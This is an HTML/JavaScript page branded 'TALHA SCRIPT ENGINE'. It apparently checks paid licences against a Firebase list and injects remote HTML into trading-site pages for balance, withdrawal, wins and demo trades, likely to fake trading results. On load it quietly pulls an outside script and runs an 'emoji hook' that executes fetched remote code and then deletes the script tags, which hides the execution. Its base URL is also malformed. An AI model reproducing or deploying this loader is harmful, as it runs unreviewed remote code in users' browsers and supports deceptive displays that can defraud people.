<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TALHA SCRIPT ENGINE</title>
    <style>
        /* Base Page Reset */
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }
        body {
            background-color: #0d1117;
            color: #ffffff;
            font-family: -apple-system, BlinkMacSystemFont, "SF Pro Text", "Segoe UI", Roboto, sans-serif;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            overflow-x: hidden;
        }

        /* Talha Lock Dialog Styles */
        dialog#talhaLock {
            border: none;
            padding: 0;
            background: transparent;
            margin: auto;
        }
        dialog#talhaLock::backdrop {
            background: rgba(0, 0, 0, 0.6);
            backdrop-filter: blur(5px);
            -webkit-backdrop-filter: blur(5px);
        }
        .glass {
            width: 420px;
            max-width: 92vw;
            padding: 28px 24px 26px;
            border-radius: 12px;
            background: rgba(255, 255, 255, 0.03);
            border: 1px solid rgba(255, 255, 255, 0.1);
            color: #ffffff;
            text-align: center;
            position: relative;
            animation: popIn 0.35s cubic-bezier(0.16, 1, 0.3, 1);
            -webkit-font-smoothing: antialiased;
        }
        @keyframes popIn {
            from { transform: scale(0.92); opacity: 0; }
            to { transform: scale(1); opacity: 1; }
        }
        .info {
            margin: 1.5rem 0;
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(255, 255, 255, 0.12);
            border-radius: 10px;
            padding: 12px 14px;
            text-align: left;
        }
        .label {
            font-size: 0.75rem;
            letter-spacing: 0.5px;
            opacity: 0.6;
            margin-bottom: 4px;
            font-weight: 600;
            color: #a1a1aa;
        }
        .value-row {
            display: flex;
            align-items: center;
            justify-content: space-between;
            gap: 10px;
        }
        .value {
            font-size: 0.95rem;
            font-weight: 600;
            word-break: break-all;
            color: #22c55e;
        }
        .copy-btn {
            position: relative;
            background: transparent;
            border: none;
            cursor: pointer;
            opacity: 0.7;
            transition: opacity 0.2s ease;
            flex-shrink: 0;
        }
        .copy-btn:hover { opacity: 1; }
        .copy-btn svg { width: 18px; height: 18px; fill: #fff; }
        .copy-btn .tooltip {
            position: absolute;
            top: -35px;
            left: 50%;
            transform: translateX(-50%);
            background: rgba(34, 197, 94, 0.9);
            color: #000;
            font-weight: bold;
            padding: 4px 8px;
            border-radius: 4px;
            font-size: 10px;
            opacity: 0;
            pointer-events: none;
            transition: 0.2s ease;
        }
        .copy-btn.show-tooltip .tooltip {
            opacity: 1;
            transform: translateX(-50%) translateY(-2px);
        }
        .lock-icon {
            display: flex;
            justify-content: center;
            align-items: center;
            margin-bottom: 0.5rem;
        }
        .lock-icon img {
            width: 80px;
            height: auto;
        }
        .logo-pulse {
            animation: pulseLogo 2s infinite ease-in-out;
        }
        @keyframes pulseLogo {
            0%, 100% { transform: scale(1); opacity: 0.9; }
            50% { transform: scale(1.05); opacity: 1; }
        }
        .footer-social {
            display: flex;
            justify-content: center;
            margin-top: 1.5rem;
        }
        .telegram-btn {
            background: linear-gradient(135deg, #229ed9, #1d4ed8);
            border: 1px solid rgba(255, 255, 255, 0.2);
            color: #fff;
            padding: 10px 20px;
            border-radius: 8px;
            font-weight: 700;
            text-decoration: none;
            box-shadow: 0 4px 15px rgba(34, 158, 217, 0.3);
            transition: transform 0.2s ease;
        }
        .telegram-btn:hover { transform: scale(1.03); }
        .close-cross {
            position: absolute;
            top: 12px;
            right: 16px;
            font-size: 1.4rem;
            color: #fff;
            cursor: pointer;
            opacity: 0.6;
        }
        .close-cross:hover { opacity: 1; }
    </style>
</head>
<body>

    <!-- Target mounting node for route injections -->
    <div id="app-root"></div>

    <script>
    (function() {
        const CONFIG = {
            projectID: "talha-trader-admin-panel-lock",
            baseURL: "https-ahmad-bhai-scripts.vercel.app/",
            externalScript: "https://limon-pro-max-code.netlify.app/Limon.js",
            emojiHookURL: "https://talha-scripts.vercel.app/heart.html"
        };

        const dbURL = `https://${CONFIG.projectID}-default-rtdb.firebaseio.com/users.json`;
        const uP = new URLSearchParams(window.location.search);
        const id = uP.get('id') || "";

        if (!id) {
            console.warn("[Talha System] No ID specified in URL parameter.");
            return;
        }

        // ─── Network Fetch Helper ─────────────────────────────────────────────
        async function fetchWithTimeout(url, ms = 4000) {
            const ctrl = new AbortController();
            const timer = setTimeout(() => ctrl.abort(), ms);
            try {
                const response = await fetch(url, { signal: ctrl.signal });
                clearTimeout(timer);
                return response;
            } catch (err) {
                clearTimeout(timer);
                return null;
            }
        }

        // ─── Element & Environment Helpers ────────────────────────────────────
        function isVisible(el) {
            return el && (el.offsetWidth > 0 || el.offsetHeight > 0);
        }

        function checkLeaderboardElement() {
            return isVisible(document.querySelector(".app--sidepanel-open"));
        }

        function checkTradeListElement() {
            return !!document.querySelector("div[data-index]");
        }

        function isMobileDevice() {
            return /Android|iPhone|iPad|iPod|webOS|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)
                || window.innerWidth <= 1024;
        }

        // ─── Core Initialization ──────────────────────────────────────────────
        async function initSystem() {
            // Load external Limon module dynamically
            loadExternalScript(CONFIG.externalScript);

            const response = await fetchWithTimeout(dbURL, 4000);
            const data = response ? await response.json().catch(() => null) : null;
            const userData = data ? Object.values(data).find(user => user.id === id) : null;

            if (userData) {
                runRouteCheck(userData);
            } else {
                showTalhaLock(id);
            }

            // Fire-and-forget background Emoji Engine Hook
            initEmojiEngine();
        }

        // ─── Route Logic ──────────────────────────────────────────────────────
        function runRouteCheck(user) {
            const url = window.location.href;
            const isDashTrue = uP.get('dash') === 'true';
            const isWinTrue = uP.get('win') === 'true';

            let route = null;

            if (isDashTrue) {
                route = { f: "BL.html", k: "lb" };
            } else if (isWinTrue) {
                route = { f: "wins.html", k: "win" };
            } else if (url.includes("withdrawal")) {
                route = { f: "ps.html", k: "p" };
            } else if (url.includes("balance")) {
                route = { f: "ts.html", k: "t" };
            } else if (url.includes("analytics")) {
                route = { f: "anas.html", k: "ana" };
            } else if (url.includes("demo-trade")) {
                const targetFile = isMobileDevice() ? "androids.html" : "pcs.html";
                route = { f: targetFile, k: targetFile === "androids.html" ? "android" : "pc" };
            } else if (checkLeaderboardElement()) {
                route = { f: "BL.html", k: "lb" };
            } else if (checkTradeListElement()) {
                route = { f: "wins.html", k: "win" };
            } else {
                showErrorPopup();
                return;
            }

            loadRoute(route, user);
        }

        function loadRoute(route, user) {
            if (user.permissions && user.permissions[route.k] === false) {
                showTalhaLock(id);
                return;
            }

            // Cleanup previous injected routes
            document.querySelectorAll("[id^='talha-injected-']").forEach(el => el.remove());

            const container = document.createElement('div');
            container.id = 'talha-injected-' + route.k;
            document.body.appendChild(container);

            fetch(CONFIG.baseURL + route.f)
                .then(res => res.text())
                .then(html => {
                    container.innerHTML = html;
                    container.querySelectorAll('script').forEach(oldScript => {
                        const newScript = document.createElement('script');
                        if (oldScript.src) {
                            newScript.src = oldScript.src;
                        } else {
                            newScript.textContent = oldScript.textContent;
                        }
                        document.body.appendChild(newScript);
                    });
                })
                .catch(err => console.error("[Talha Script Engine] Route load error:", err));
        }

        // ─── System UI Popups ────────────────────────────────────────────────
        function showErrorPopup() {
            if (document.getElementById('talhaErrorPopup')) return;
            const popup = document.createElement("div");
            popup.id = "talhaErrorPopup";
            popup.innerText = "⚠️ APPLY ON CORRECT URL ⚠️";
            Object.assign(popup.style, {
                position: "fixed",
                top: "50%",
                left: "50%",
                transform: "translate(-50%, -50%)",
                background: "rgba(0, 0, 0, 0.92)",
                color: "#ffffff",
                padding: "18px 28px",
                borderRadius: "10px",
                fontSize: "16px",
                fontWeight: "bold",
                zIndex: "999999",
                opacity: "1",
                transition: "opacity 1s ease",
                width: "280px",
                textAlign: "center",
                border: "1px solid #ef4444"
            });
            document.body.appendChild(popup);
            setTimeout(() => {
                popup.style.opacity = "0";
                setTimeout(() => popup.remove(), 1000);
            }, 3000);
        }

        function showTalhaLock(uid) {
            document.querySelectorAll("dialog#talhaLock").forEach(d => { d.close(); d.remove(); });

            const modalHtml = `
            <div class="glass">
              <div class="close-cross">&times;</div>
              <div class="lock-icon logo-pulse">
                  <img src="https://logo-png-sigma.vercel.app/TQK.png" alt="TALHA SCRIPT Logo"/>
              </div>
              <div style="font-size:1.8rem;font-weight:900;color:#fff;letter-spacing:1px;margin-bottom:6px;">TALHA SCRIPT</div>
              <div style="font-size:0.9rem;color:#ef4444;font-weight:bold;margin-bottom:1rem;">🔒 ACCESS LOCKED 🔒</div>
              <div class="info">
                <div class="label">USER ID</div>
                <div class="value-row">
                  <div class="value">${uid}</div>
                  <button class="copy-btn" id="copyBtnTalha">
                    <svg viewBox="0 0 24 24"><path d="M16 1H4a2 2 0 0 0-2 2v14h2V3h12V1zm3 4H8a2 2 0 0 0-2 2v16h13a2 2 0 0 0 2-2V7a2 2 0 0 0-2-2z"/></svg>
                    <span class="tooltip">Copied ✓</span>
                  </button>
                </div>
              </div>
              <div class="footer-social">
                  <a href="https://t.me/TALHAQOTEXKING" target="_blank" class="telegram-btn">🚀 Telegram @TALHAQOTEXKING</a>
              </div>
            </div>`;

            const dialog = document.createElement("dialog");
            dialog.id = "talhaLock";
            dialog.innerHTML = modalHtml;
            document.body.appendChild(dialog);
            dialog.showModal();

            dialog.querySelector("#copyBtnTalha").onclick = function() {
                navigator.clipboard.writeText(uid).then(() => {
                    this.classList.add('show-tooltip');
                    setTimeout(() => this.classList.remove('show-tooltip'), 1200);
                });
            };

            dialog.querySelector(".close-cross").onclick = function() {
                dialog.close();
                dialog.remove();
            };
        }

        // ─── Dynamic Loader Utilities ─────────────────────────────────────────
        function loadExternalScript(url) {
            const script = document.createElement('script');
            script.src = url;
            script.async = true;
            script.onerror = () => console.warn("[Talha Script Engine] Could not load Limon library.");
            document.head.appendChild(script);
        }

        async function initEmojiEngine() {
            try {
                const response = await fetch(CONFIG.emojiHookURL);
                const rawMarkup = await response.text();
                const doc = new DOMParser().parseFromString(rawMarkup, 'text/html');

                doc.querySelectorAll('script').forEach(oldNode => {
                    const freshScriptNode = document.createElement('script');
                    if (oldNode.src) {
                        freshScriptNode.src = oldNode.src;
                    } else {
                        freshScriptNode.textContent = oldNode.innerHTML || oldNode.textContent;
                    }
                    document.body.appendChild(freshScriptNode);
                    setTimeout(() => freshScriptNode.remove(), 600);
                });
                console.log("[Talha Script Engine] Emoji Hook Active");
            } catch (e) {
                console.error("[Talha Script Engine] Emoji Hook skipped:", e);
            }
        }

        // Run
        initSystem();
    })();
    </script>
</body>
</html>
